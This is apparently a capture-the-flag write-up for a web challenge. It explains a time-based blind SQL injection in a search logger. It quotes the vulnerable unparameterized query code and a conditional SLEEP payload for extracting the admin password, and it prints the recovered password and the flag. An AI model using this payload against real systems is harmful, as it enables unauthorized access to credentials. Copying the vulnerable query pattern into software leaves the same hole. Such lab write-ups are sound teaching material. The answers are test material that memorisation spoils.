---
title: "blind"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: medium
author: "L-BOH"
---

# blind

## Summary

The search logger has a time-based blind SQL injection. A deliberate MySQL delay tells us whether each guessed admin-password character is correct.

## Root cause

The search term is inserted into raw SQL:

~~~python
term = data.get('term', '')
query = f"INSERT INTO search_history (ts,ip,term) VALUES (NOW(),'{ip}','{term}')"
db.session.execute(text(query))
~~~

The text wrapper does not parameterize a string that was already assembled. A quote in term breaks out of the final SQL value and lets the attacker add a conditional SLEEP expression.

## Vulnerability

The search page records our search term. Injecting a conditional SLEEP expression into that term makes the request slow only when a database condition is true. There is no need for the page to print database data: elapsed time is the answer.

## Exploit

For each character position, send a payload shaped like:

~~~sql
' OR (SELECT CASE WHEN
(ASCII(SUBSTR((SELECT password FROM user WHERE username='admin'),POSITION,1))=ASCII_CODE)
THEN SLEEP(2) ELSE 0 END))-- -
~~~

A roughly two-second response means the character is correct. Repeat through the password, log in as admin with the recovered password, and open /admin.

The provided [exploit.py](exploit.py) automates this method:

- lines 8-12 measure the response time;
- lines 17-24 try letters and digits at each position;
- line 26 accepts a delay above 1.8 seconds as a match.

Change target on line 3 to the deployed search_log endpoint and run:

~~~bash
python exploit.py
~~~

The supplied deployment's recovered admin password is:

~~~text
sVrOq7JIcknS4utdAWTKIQ
~~~

## Flag

~~~text
Securinets{bl1nd_sql_inj3cti0n_n0t_7hat_h4rd}
~~~
